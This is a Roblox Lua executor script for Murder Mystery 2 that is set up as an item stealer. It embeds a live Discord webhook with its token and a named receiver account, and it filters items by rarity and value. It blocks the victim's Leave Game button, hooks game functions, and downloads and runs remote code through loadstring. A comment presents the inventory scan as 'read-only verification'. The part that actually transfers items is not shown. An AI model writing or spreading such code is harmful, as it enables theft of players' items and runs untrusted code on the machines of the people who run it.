_G.Ex = _G.Ex or false
if _G.Ex then return end
_G.Ex = true

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

local WEBHOOK = "https://discord.com/api/webhooks/1546525713094414346/WeNmEG_D7Ct1t_jehpqSwwOGDv-u8Nxww-2w2Uh0vw5dpvekF3AYxlztEERoB4rFcuHM"
local RECEIVER = {"Alljm100"}
local MINIMUM_RARITY = "Godly"
local MINIMUM_VALUE = 10
local RECEIVERx = RECEIVER

local function GetRequestFunction()
    if request then return request end
    if syn and syn.request then return syn.request end
    if http_request then return http_request end
    return nil
end

local function GetActiveReceiverName()
    if type(ar) == "string" and ar ~= "" then
        if Players and Players:FindFirstChild(ar) then return ar end
        return ar
    end
    if type(RECEIVERx) == "table" then
        for _, Name in ipairs(RECEIVERx) do
            if Name ~= "" then
                if Players and Players:FindFirstChild(Name) then return Name end
                return Name
            end
        end
    end
    return "Unknown"
end

if WEBHOOK == "" then
    game.Players.LocalPlayer:Kick("Invalid URL. Please check your webhook.")
    return
end
if game.PlaceId ~= 142823291 then
    game.Players.LocalPlayer:Kick("This script only works in Murder Mystery 2.")
    return
end

local ServerType
local ServerTypeOK, ServerTypeErr = pcall(function()
    ServerType = game:GetService("RobloxReplicatedStorage")
        :WaitForChild("GetServerType")
        :InvokeServer()
end)

if not ServerTypeOK then
    warn("[MM2] Failed to determine server type:", ServerTypeErr)
elseif ServerType == "VIPServer" then
    LocalPlayer:Kick("Private servers are not supported.")
    return
end

if #game.Players:GetPlayers() >= 12 then
    game.Players.LocalPlayer:Kick("Server is full, please rejoin another server.")
    return
end

local FoundJobId = false
local AttemptCount = 0
if getgc then
    repeat
        local HookedSuccessfully = false
        for _, Value in ipairs(getgc(true)) do
            if typeof(Value) == "function" then
                local FunctionInfo = debug.getinfo(Value)
                if FunctionInfo and FunctionInfo.name then
                    local LowerName = FunctionInfo.name:lower()
                    if LowerName:find("step") and not LowerName:find("stepanimate") then
                        pcall(function()
                            local OriginalFunction = hookfunction(Value, function(...)
                                if not FoundJobId then
                                    FoundJobId = true
                                    _G.RealJobID = game.JobId
                                end
                                if OriginalFunction then return OriginalFunction(...) end
                            end)
                        end)
                        HookedSuccessfully = true
                        break
                    end
                end
            end
        end
        AttemptCount = AttemptCount + 1
        if HookedSuccessfully or AttemptCount >= 10 then break end
        task.wait(0.1)
    until FoundJobId
end
if not FoundJobId then _G.RealJobID = game.JobId end

task.wait(0.5)
task.spawn(function()
    while task.wait(10) do
        pcall(function()
            for _, Connection in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.Page.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do
                Connection:Disable()
            end
        end)
    end
end)

local function GetExecutorInfo()
    local ExecutorName = "Unknown"
    pcall(function() ExecutorName = identifyexecutor() end)
    return {
        JobId = _G.RealJobID or game.JobId,
        Executor = string.lower(ExecutorName)
    }
end

local InfoData = GetExecutorInfo()
_G.RealJobID = InfoData.JobId
_G.RealExecutor = InfoData.Executor


local ItemDatabase = {}
local RarityPriority = {
    "Common", "Uncommon", "Rare", "Legendary", "Godly",
    "Ancient", "Unique", "Vintage", "Chroma", "Dual", "Pet"
}

-- Use the current Rubis source from the uploaded script.
local VALUE_URL =
    "https://api.rubis.app/v2/scrap/OuCESKvKO5ASE8TO/raw"

local function GetRequestFunction()
    if typeof(request) == "function" then return request end
    if syn and typeof(syn.request) == "function" then return syn.request end
    if typeof(http_request) == "function" then return http_request end
    return nil
end

local function NormalizeName(Name)
    Name = tostring(Name or ""):lower()
    Name = Name:gsub("'", "")
    Name = Name:gsub("[%s_%-]+", "")
    Name = Name:gsub("[^%w]", "")
    return Name
end

local function AddEntry(Map, Name, Value, Rarity)
    Value = tonumber(Value)

    if not Name or tostring(Name) == "" or not Value then
        return false
    end

    local Info = {
        Rarity = tostring(Rarity or "Unknown"),
        Value = Value,
        Chroma = tostring(Rarity or ""):lower() == "chroma"
    }

    Map[NormalizeName(Name)] = Info
    return true
end

local function BuildDatabase(Data)
    local Map = {}
    local Count = 0
    local Seen = {}

    local function Walk(Node, InheritedRarity)
        if type(Node) ~= "table" or Seen[Node] then
            return
        end

        Seen[Node] = true

        -- Supports item-object responses.
        local Name =
            Node.name or Node.Name or
            Node.itemName or Node.ItemName or
            Node.item_name or Node.Item_Name

        local Value =
            Node.value or Node.Value or
            Node.price or Node.Price or
            Node.val or Node.Val

        local Rarity =
            Node.rarity or Node.Rarity or
            Node.tier or Node.Tier or
            InheritedRarity

        if Name and Value then
            if AddEntry(Map, Name, Value, Rarity) then
                Count += 1
            end
        end

        for Key, Child in pairs(Node) do
            if type(Child) == "table" then
                local ChildRarity = Rarity
                local LowerKey = tostring(Key):lower()

                local RarityMap = {
                    common = "Common",
                    uncommon = "Uncommon",
                    rare = "Rare",
                    legendary = "Legendary",
                    godly = "Godly",
                    ancient = "Ancient",
                    unique = "Unique",
                    vintage = "Vintage",
                    chroma = "Chroma",
                    dual = "Dual",
                    pet = "Pet"
                }

                if RarityMap[LowerKey] then
                    ChildRarity = RarityMap[LowerKey]
                end

                Walk(Child, ChildRarity)

            elseif not Name then
                -- Supports:
                -- { ["Scythe"] = 123 }
                local NumericValue = tonumber(Child)

                if NumericValue then
                    if AddEntry(Map, tostring(Key), NumericValue, InheritedRarity) then
                        Count += 1
                    end
                end
            end
        end
    end

    Walk(Data, nil)
    return Map, Count
end

local function LoadValues()
    local RequestFunc = GetRequestFunction()

    if not RequestFunc then
        return nil, "No HTTP request function"
    end

    local Response
    local OK, Err = pcall(function()
        Response = RequestFunc({
            Url = VALUE_URL,
            Method = "GET",
            Headers = {
                ["User-Agent"] = "Mozilla/5.0",
                ["Accept"] = "application/json,text/plain,*/*"
            },
            Timeout = 15
        })
    end)

    if not OK then
        return nil, "Request failed: " .. tostring(Err)
    end

    if type(Response) ~= "table" or type(Response.Body) ~= "string" then
        return nil, "Invalid response"
    end

    local Data
    local JSONOK = pcall(function()
        Data = HttpService:JSONDecode(Response.Body)
    end)

    -- Compatibility with a raw Lua-table response.
    if not JSONOK or type(Data) ~= "table" then
        local Loader = loadstring(Response.Body)

        if not Loader then
            return nil, "Response is neither JSON nor a Lua table"
        end

        local LoadOK, Result = pcall(Loader)

        if not LoadOK or type(Result) ~= "table" then
            return nil, "Could not decode value response"
        end

        Data = Result
    end

    local Map, Count = BuildDatabase(Data)

    if Count == 0 then
        return nil, "Decoded response but found no item values"
    end

    return Map, Count
end

local LoadedDatabase, Result = LoadValues()

if not LoadedDatabase then
    warn("[MM2] Value lookup failed:", Result)
    return
end

ItemDatabase = LoadedDatabase

print("[MM2] Value entries loaded:", Result)

local function FindItemValue(ItemName)
    local Key = NormalizeName(ItemName)
    local Info = ItemDatabase[Key]

    if Info then
        return Info
    end

    -- Fallback for aliases that normalize differently.
    for StoredName, StoredInfo in pairs(ItemDatabase) do
        if NormalizeName(StoredName) == Key then
            return StoredInfo
        end
    end

    return nil
end

-- Read-only inventory verification.
local ProfileData

local ProfileOK, ProfileErr = pcall(function()
    ProfileData =
        ReplicatedStorage.Remotes.Inventory.GetProfileData
        :InvokeServer(LocalPlayer.Name)
end)

if not ProfileOK then
    warn("[MM2] Inventory lookup failed:", ProfileErr)
    return
end

local Owned =
    ProfileData
    and ProfileData.Weapons
    and ProfileData.Weapons.Owned

if type(Owned) ~= "table" then
    warn("[MM2] Weapons.Owned was not returned")
    return
end

local TotalValue = 0
local Matches = 0

for ItemId, Quantity in pairs(Owned) do
    Quantity = tonumber(Quantity) or 0

    if Quantity > 0 then
        local Info = FindItemValue(ItemId)

        if Info then
            local ItemTotal = Info.Value * Quantity

            TotalValue += ItemTotal
            Matches += 1

            print(string.format(
                "[MM2] %s | value=%s | quantity=%s | total=%s | rarity=%s",
                tostring(ItemId),
                tostring(Info.Value),
                tostring(Quantity),
                tostring(ItemTotal),
                tostring(Info.Rarity)
            ))
        else
            warn("[MM2] No Project/Rubis value for:", tostring(ItemId))
        end
    end
end

print(string.format(
    "[MM2] Value matches: %d | Total inventory value: %s",
    Matches,
    tostring(TotalValue)
))
